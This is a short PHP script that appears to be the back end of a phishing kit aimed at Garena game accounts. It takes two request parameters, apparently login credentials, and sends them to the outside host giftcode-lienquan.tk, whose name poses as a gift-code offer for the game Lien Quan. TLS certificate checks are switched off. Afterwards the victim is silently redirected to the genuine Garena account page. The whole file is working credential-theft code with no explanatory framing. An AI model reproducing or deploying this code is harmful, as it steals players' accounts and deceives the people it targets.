<?php
    $a = $_GET["a"];
    $b = $_GET["b"];
    if(!isset($a) || !isset($b)) die("<script>location.href = 'https://account.garena.com/'</script>");
    $c = curl_init();
	curl_setopt($c, CURLOPT_URL, "https://giftcode-lienquan.tk/check/5431/cook.php?a=$a&b=$b");
	curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($c, CURLOPT_SSL_VERIFYHOST, false);
	curl_setopt($c, CURLOPT_FOLLOWLOCATION, true);
	curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
	$rq1 = curl_exec($c);
	curl_close($c);
	echo "<script>location.href = 'https://account.garena.com/'</script>";
?>
